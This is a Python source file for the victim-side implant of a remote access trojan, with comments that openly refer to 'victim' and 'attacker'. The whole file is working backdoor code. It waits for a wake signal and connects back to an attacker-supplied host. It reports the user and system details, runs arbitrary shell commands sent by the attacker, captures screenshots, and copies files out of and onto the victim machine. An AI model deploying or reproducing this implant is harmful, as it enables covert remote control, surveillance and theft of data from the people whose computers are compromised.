# -*- coding: utf-8 -*
import socket, subprocess, os, platform, threading ,logging,time,getpass, encrypted_connection

#Check the system platform, if windows, import differcent library.
if platform.system() == "Windows" :
    from PIL import ImageGrab
else :
    import pyscreenshot as ImageGrab

HOST = "0.0.0.0"  #Victim's IP adress, if set to 0.0.0.0, accept every incommming ip connection
PORT = 6970 #Victim's port on which server is listening.
Quit = True #Creating a boolean variable that is used to exit the main loop.
class ClientThread(threading.Thread) : #Create a thread that if started, launch a client socket and connect to the attacker.
    def __init__(self, HostClient : str, PortClient: int):
        super().__init__()
        self.stop_thread = False
        self.HOST = HostClient
        self.PORT = PortClient
    def run(self):
        clientConnexion = encrypted_connection.client(b"d41d8cd98f00b205")
        clientConnexion.initialize_tcp_connexion_client(self.HOST,self.PORT)
        defaultPath = os.getcwd()
        clientConnexion.send_message_client("Nom : "+os.name+"\n"
                                    "Systeme : "+platform.system()+"\n"
                                    "Kernel : "+ platform.release() + "\n"
                                    "User : "+getpass.getuser() + "\n"
                                    "Default path : "+ defaultPath )
        
        while not self.stop_thread:
            command = ""
            command = clientConnexion.receive_message_client()
            #print("Received command : " +command)
            if(command.split()[0] == "cd"):
                if len(command.split()) == 1:
                    clientConnexion.send_message_client((os.getcwd()))
                elif len(command.split()) == 2:
                    try:
                        os.chdir(command.split()[1])
                        clientConnexion.send_message_client(("Directory : " + os.getcwd()))
                    except OSError as winerror:
                        clientConnexion.send_message_client(("No such directory in : " +os.getcwd()))
            elif command == "stb" :
                im = ImageGrab.grab()
                fileName = "pic.png"
                try :
                    im.save(fileName)
                    clientConnexion.UploadFile(fileName)
                    os.remove(fileName)
                except :
                    clientConnexion.send_message_client(("permissionsfailed"))
            elif "dl" in command :
                split_command = command.split()
                try :
                    clientConnexion.UploadFile(split_command[1])
                except:
                    clientConnexion.send_message_client(("permissionsfailed"))
            elif "upload" in command :
                split_command = command.split()
                try :
                    clientConnexion.DownloadFile(defaultPath,split_command[1])
                except:
                    clientConnexion.send_message_client(("permissionsfailed"))
            elif command == "exit" :
                break
            else:
                # do shell command
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                # read output
                stdout_value = proc.stdout.read() + proc.stderr.read()
                # send output to attacker
                if(stdout_value != ""):
                    clientConnexion.send_raw_data_client(stdout_value)  # renvoit l'output  à l'attaquant
                    #print(stdout_value.decode("utf-8"))
                else:
                    clientConnexion.send_raw_data_client((command+ " does not return anything"))
        clientConnexion.close_tcp_connexion_client()
    def stop(self):
        self.stop_thread = True
while Quit: #This loop is used to keep the server alive, if wanted. It also start a instace of  ClientThread is receive wake.
    encrypter = encrypted_connection.server(b"d41d8cd98f00b205")
    client_ip = encrypter.initialize_tcp_connexion_server(HOST,PORT)
    encrypter.send_message_server("online")
    message = encrypter.receive_message_server()
    connexion_credential = message.split(" ")
    ClientThreadVar = ClientThread(str(connexion_credential[0]), int(connexion_credential[1]))
    while True:
        message = encrypter.receive_message_server()
        if message == "wake" :
            ClientThreadVar.start()
            print("after thread")
        if message == "shutdown" :
            print("Stopping the thread")
            ClientThreadVar.stop()
            ClientThreadVar.join()
            print("Thread stopped")
            break
        if message == "quit" :
            print("Stopping the thread")
            ClientThreadVar.stop()
            ClientThreadVar.join()
            print("Thread stopped")
            Quit = False
            break
